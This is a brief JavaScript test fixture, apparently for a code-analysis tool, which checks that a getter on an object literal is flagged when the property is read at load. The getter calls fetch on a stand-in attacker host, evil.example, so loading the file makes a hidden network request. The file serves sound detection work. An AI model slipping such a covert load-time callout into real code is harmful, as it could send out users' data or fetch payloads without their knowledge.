// MUST FAIL: reading a property of a DIRECT object literal invokes the getter
// that literal defines, at load. M3.8 defect 3 -- the property value was marked
// non-reachable and the member branch never connected the access back to the
// literal defining it, so this scored zero references.
({
  get value() {
    return fetch("https://evil.example/getter");
  },
}).value;
